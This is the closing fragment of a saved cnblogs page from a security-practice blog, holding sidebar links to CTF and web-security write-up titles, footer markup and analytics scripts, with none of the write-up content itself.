+                            <a href="https://www.cnblogs.com/R3col/p/14741709.html">
+                                1. 发现Webpack中泄露的api(1)
+                            </a>
+                        </li>
+                        <li>
+                            <a href="https://www.cnblogs.com/R3col/p/14122684.html">
+                                2. CTFHub-技能树-SSRF(1)
+                            </a>
+                        </li>
+                        <li>
+                            <a href="https://www.cnblogs.com/R3col/p/12989796.html">
+                                3. Portswigger web security academy：Stored XSS (1)
+                            </a>
+                        </li>
+                        <li>
+                            <a href="https://www.cnblogs.com/R3col/p/12989789.html">
+                                4. Portswigger web security academy：Reflected XSS (1)
+                            </a>
+                        </li>
+                        <li>
+                            <a href="https://www.cnblogs.com/R3col/p/12617189.html">
+                                5. Bugku-INSERT INTO 注入(1)
+                            </a>
+                        </li>
+            </ul>
+        </div>
+    </div>
+</div></div></div>
+                    <script>loadBlogSideColumn();</script>
+			</div>			
+		</div><!--end: sideBarMain -->
+	</div><!--end: sideBar 侧边栏容器 -->
+	<div class="clear"></div>
+	</div><!--end: main -->
+	<div class="clear"></div>
+	<div id="footer"> <div class="footer-image" id="footerStyle1" style="display:none"></div> <footer id="footerStyle2" style=""> <footer-background> <figure class="clouds" style="background: url(&quot;https://cdn.cnblogs.com/gh/BNDong/Cnblogs-Theme-SimpleMemory@v2.1.0/dist/images/0ff63a3006d8a2821be2.webp&quot;) repeat-x;"></figure> <figure class="background" style="background: url(&quot;https://cdn.cnblogs.com/gh/BNDong/Cnblogs-Theme-SimpleMemory@v2.1.0/dist/images/af2701cbb4196bedb254.webp&quot;) repeat-x;"></figure> <figure class="foreground" style="background: url(&quot;https://cdn.cnblogs.com/gh/BNDong/Cnblogs-Theme-SimpleMemory@v2.1.0/dist/images/30b4f3f93333bef2cf56.webp&quot;) repeat-x;"></figure> </footer-background> </footer> <div class="footer-box"> <div class="footer-text" style="display: none; padding-bottom: 0px; border-bottom: none; margin-bottom: 0px;"> [ ##textLeft## <span class="footer-text-icon"> <span class="iconfont ##iconFont##" style="color:##iconColor##;font-size:##iconSize##"></span> </span> ##textRight## ] </div> <div> <span id="blogRunTimeSpan">This blog has running : 1481 d 15 h 43 m 59 s</span> <span class="my-face">ღゝ◡╹)ノ♡</span> </div> <div id="linksHtml" style="display:none">##linksHtml##</div> <div id="cnzzInfo" style="display:none"> <div id="cnzzProtocol" style="display:none"> <span class="id_cnzz_stat_icon" id="cnzz_stat_icon_##cnzzId##"></span> <script src="./CTFHub-技能树-SSRF - R3col - 博客园_files/z_stat.php"></script> </div> ##cnzzHtml## </div> <div>
+		
+Copyright © 2023 R3col
+Powered by .NET 7.0 on Kubernetes
+
+
+
+	</div> </div></div><!--end: footer -->
+</div><!--end: home 自定义的最大容器 -->
+
+
+
+    <div id="page_end_html">
+        
+<div id="cnzzProtocol" style="display: none;">
+    <span class="id_cnzz_stat_icon" id="cnzz_stat_icon_1278670777"></span>
+    <script src="./CTFHub-技能树-SSRF - R3col - 博客园_files/z_stat(1).php" type="text/javascript"></script>
+</div>
+<script src="./CTFHub-技能树-SSRF - R3col - 博客园_files/mouse.js.下载"></script>
+    </div><canvas width="1298" height="616" style="position: fixed; left: 0px; top: 0px; z-index: 2147483647; pointer-events: none;"></canvas>
+
+    <input type="hidden" id="antiforgery_token" value="CfDJ8DuWIYDefEVJtUW7VadsHY-0MkXesYHe5VBj0Ryn3EjuJ07w9CcVfykdQX6dtS77XctxvQMsueYx8hOAURNgCNxkK16g3D8jzgKz6goTFlyyGGGV97JP2A9ngTHi9ZsnceebmVqHDQaEB5VCa1m8VZc">
+    <script async="" src="./CTFHub-技能树-SSRF - R3col - 博客园_files/js"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    var kv = getGACustom();
+    if (kv) {
+        gtag('set', kv);
+    }
+    gtag('config', 'UA-476124-1');
+</script>
+<script defer="" src="./CTFHub-技能树-SSRF - R3col - 博客园_files/hm.js.下载"></script>
+
+<script type="text/javascript">
+    window.cnblogsConfig = {
+      info: {
+        name: 'r3col', // 用户名
+        startDate: '2019-06-03', // 入园时间，年-月-日。入园时间查看方法：鼠标停留园龄时间上，会显示入园时间
+        avatar: 'https://pic.cnblogs.com/face/1706496/20210228003438.png', // 用户头像
+      },
+      banner: {
+        home: {
+            title: '知黑守白',
+        },
+    },
+    }
+</script><script type="text/javascript">getFollowStatus('2f8aa281-e0eb-480b-4907-08d6e658f5b8');</script></body></html>
